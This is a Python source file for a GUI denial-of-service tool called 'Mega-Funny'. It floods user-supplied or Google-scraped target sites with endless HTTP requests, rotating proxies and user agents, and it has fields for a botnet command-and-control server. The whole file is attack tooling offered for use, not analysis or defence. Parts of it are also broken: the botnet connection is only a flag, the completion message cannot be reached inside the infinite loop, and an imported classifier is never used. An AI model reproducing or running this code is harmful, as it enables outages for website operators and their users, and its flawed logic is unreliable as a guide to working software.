import tkinter as tk
from tkinter import messagebox, filedialog, ttk
import requests
import multiprocessing
import random
import time
import psutil
from bs4 import BeautifulSoup
from urllib.parse import urlparse
from sklearn.ensemble import RandomForestClassifier

class DDoSAttackGUI:
    def __init__(self, master):
        self.master = master
        master.title("Mega-Funny")

        self.header_label = tk.Label(master, text="Mega-Funny", font=("Helvetica", 16, "bold"))
        self.header_label.pack()

        self.target_url_label = tk.Label(master, text="Target URLs/IPs (comma-separated or load from file):")
        self.target_url_label.pack()
        self.target_url_entry = tk.Entry(master, width=50)
        self.target_url_entry.pack()
        self.load_targets_button = tk.Button(master, text="Load Targets from File", command=self.load_targets)
        self.load_targets_button.pack()

        self.num_requests_label = tk.Label(master, text="Number of Requests per URL/IP:")
        self.num_requests_label.pack()
        self.num_requests_entry = tk.Entry(master, width=50)
        self.num_requests_entry.pack()

        self.threads_label = tk.Label(master, text="Number of Processes:")
        self.threads_label.pack()
        self.threads_entry = tk.Entry(master, width=50)
        self.threads_entry.pack()

        self.proxies_label = tk.Label(master, text="Proxies (comma-separated or load from file):")
        self.proxies_label.pack()
        self.proxies_entry = tk.Entry(master, width=50)
        self.proxies_entry.pack()
        self.load_proxies_button = tk.Button(master, text="Load Proxies from File", command=self.load_proxies)
        self.load_proxies_button.pack()

        self.user_agents_label = tk.Label(master, text="User Agents (comma-separated or load from file):")
        self.user_agents_label.pack()
        self.user_agents_entry = tk.Entry(master, width=50)
        self.user_agents_entry.pack()
        self.load_user_agents_button = tk.Button(master, text="Load User Agents from File", command=self.load_user_agents)
        self.load_user_agents_button.pack()

        self.keyword_label = tk.Label(master, text="Keyword for Reconnaissance:")
        self.keyword_label.pack()
        self.keyword_entry = tk.Entry(master, width=50)
        self.keyword_entry.pack()

        self.botnet_ip_label = tk.Label(master, text="Botnet C&C IP:")
        self.botnet_ip_label.pack()
        self.botnet_ip_entry = tk.Entry(master, width=50)
        self.botnet_ip_entry.pack()

        self.botnet_port_label = tk.Label(master, text="Botnet C&C Port:")
        self.botnet_port_label.pack()
        self.botnet_port_entry = tk.Entry(master, width=50)
        self.botnet_port_entry.pack()

        self.botnet_connect_button = tk.Button(master, text="Connect to Botnet", command=self.connect_to_botnet)
        self.botnet_connect_button.pack()

        self.start_button = tk.Button(master, text="Start Attack", command=self.start_attack)
        self.start_button.pack()

        self.recon_button = tk.Button(master, text="Start Reconnaissance", command=self.start_reconnaissance)
        self.recon_button.pack()

        self.monitor_button = tk.Button(master, text="Start Monitoring", command=self.start_monitoring)
        self.monitor_button.pack()

        self.progress_label = tk.Label(master, text="Attack Progress:")
        self.progress_label.pack()
        self.progress_bar = ttk.Progressbar(master, orient="horizontal", length=200, mode="determinate")
        self.progress_bar.pack()

        self.status_label = tk.Label(master, text="Status: Idle", fg="green")
        self.status_label.pack()

        self.footer_label = tk.Label(master, text="built by Deadman", font=("Helvetica", 10, "italic"))
        self.footer_label.pack(side=tk.BOTTOM)

        self.target_urls = []
        self.proxies = []
        self.user_agents = []
        self.recon_targets = []

        self.botnet_ip = ""
        self.botnet_port = 0
        self.botnet_connected = False

        self.attack_process = None
        self.monitor_process = None

    def load_file(self, entry_widget, storage_list):
        file_path = filedialog.askopenfilename()
        if file_path:
            with open(file_path, 'r') as file:
                lines = file.readlines()
                storage_list.extend([line.strip() for line in lines])
            entry_widget.insert(0, ", ".join(storage_list))

    def load_targets(self):
        self.load_file(self.target_url_entry, self.target_urls)

    def load_proxies(self):
        self.load_file(self.proxies_entry, self.proxies)

    def load_user_agents(self):
        self.load_file(self.user_agents_entry, self.user_agents)

    def start_reconnaissance(self):
        try:
            keyword = self.keyword_entry.get().strip()
            if not keyword:
                raise ValueError("Please enter a keyword for reconnaissance.")
            self.recon_targets = self.perform_reconnaissance(keyword)
            messagebox.showinfo("Reconnaissance", "Reconnaissance completed. Found {} potential targets.".format(len(self.recon_targets)))
        except Exception as e:
            messagebox.showerror("Reconnaissance Error", str(e))

    def perform_reconnaissance(self, keyword):
        potential_targets = set()
        # Advanced reconnaissance techniques (e.g., scraping multiple sources)
        search_query = "https://www.google.com/search?q={}".format(keyword)
        response = requests.get(search_query)
        soup = BeautifulSoup(response.text, 'html.parser')
        links = soup.find_all('a')
        for link in links:
            href = link.get('href')
            if href and href.startswith('/url?q='):
                url = urlparse(href[7:]).netloc
                if url:
                    potential_targets.add(url)
        return list(potential_targets)

    def connect_to_botnet(self):
        try:
            botnet_ip = self.botnet_ip_entry.get().strip()
            botnet_port = int(self.botnet_port_entry.get().strip())
            if not botnet_ip or not botnet_port:
                raise ValueError("Please enter Botnet C&C IP and Port.")
            self.botnet_ip = botnet_ip
            self.botnet_port = botnet_port
            self.botnet_connected = True
            messagebox.showinfo("Botnet Connection", "Connected to Botnet C&C.")
        except Exception as e:
            messagebox.showerror("Botnet Connection Error", str(e))

    def start_attack(self):
        try:
            # Check if connected to botnet
            if not self.botnet_connected:
                raise ValueError("Please connect to the Botnet C&C before starting the attack.")
            # Start the attack...
            self.attack_process = multiprocessing.Process(target=self.perform_attack)
            self.attack_process.start()
            self.status_label.config(text="Status: Running", fg="blue")
        except ValueError as e:
            messagebox.showerror("Input Error", str(e))

    def perform_attack(self):
        try:
            while True:
                num_requests = int(self.num_requests_entry.get())
                threads = int(self.threads_entry.get())
                self.progress_bar["maximum"] = num_requests * len(self.target_urls)
                self.progress_bar["value"] = 0

                for url in self.target_urls:
                    for _ in range(num_requests):
                        proxy = random.choice(self.proxies) if self.proxies else None
                        user_agent = random.choice(self.user_agents) if self.user_agents else "Mozilla/5.0"
                        headers = {"User-Agent": user_agent}
                        self.send_request(url, headers, proxy)
                        self.progress_bar["value"] += 1
                        time.sleep(0.01)  # Adjust sleep time as needed for adaptive strategy

                # Sleep between attack cycles
                time.sleep(5)

            messagebox.showinfo("Attack Complete", "DDoS attack completed.")
            self.status_label.config(text="Status: Idle", fg="green")
        except Exception as e:
            messagebox.showerror("Attack Error", str(e))

    def send_request(self, url, headers, proxy):
        try:
            response = requests.get(url, headers=headers, proxies={"http": proxy, "https": proxy}, timeout=5)
            if response.status_code == 200:
                print(f"Request sent to {url} successfully.")
            else:
                print(f"Failed to send request to {url}. Status code: {response.status_code}")
        except Exception as e:
            print(f"Error sending request to {url}: {e}")

    def start_monitoring(self):
        self.monitor_process = multiprocessing.Process(target=self.monitor_system)
        self.monitor_process.start()

    def monitor_system(self):
        while True:
            cpu_usage = psutil.cpu_percent(interval=1)
            memory_usage = psutil.virtual_memory().percent
            self.status_label.config(text=f"CPU Usage: {cpu_usage}% | Memory Usage: {memory_usage}%")
            time.sleep(1)

root = tk.Tk()
my_gui = DDoSAttackGUI(root)
root.mainloop()